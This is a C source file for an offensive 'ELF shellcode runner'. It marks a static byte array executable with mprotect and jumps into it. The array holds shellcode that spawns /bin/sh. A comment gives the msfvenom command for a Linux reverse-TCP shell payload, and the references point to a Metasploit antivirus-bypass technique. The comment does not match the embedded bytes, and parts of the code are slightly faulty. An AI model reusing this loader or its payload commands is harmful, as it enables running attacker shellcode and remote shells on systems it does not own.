/*

Simple ELF shellcode runner

Reference:
	* https://tuttlem.github.io/2017/10/28/executing-shellcode-in-c.html 
	* https://stackoverflow.com/questions/27900201/create-and-test-x86-64-elf-executable-shellcode-on-a-linux-machine
	* https://man7.org/linux/man-pages/man2/mprotect.2.html
	* https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates
*/
#include <unistd.h>
#include <sys/mman.h>


// handcrafted payload here
// msfvenom -p linux/x86/shell/reverse_tcp LHOST=4444 LHOST=127.0.0.1 -f c
unsigned char shellcode_bin[] = {
  0x48, 0x31, 0xff, 0x57, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x00, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2,
  0x31, 0xc0, 0xb0, 0x3b, 0x0f, 0x05, 0xeb, 0x00, 0x66, 0xb8, 0x3c, 0x00,
  0x48, 0x31, 0xff, 0x0f, 0x05
};
unsigned int shellcode_bin_len = 41;
// msf template below
//unsigned char PAYLOAD[SCSSIZE] = "PAYLOAD: ";

int main(int argc, char *argv[]) {

	// create executable memory
    mprotect((void*)((intptr_t)shellcode_bin & ~0xFFF), shellcode_bin_len, PROT_READ|PROT_EXEC);  
    int (*exeshell)() = (int (*)()) shellcode_bin;  
    (int)(*exeshell)(); // execute shellcode

	return 0;
}
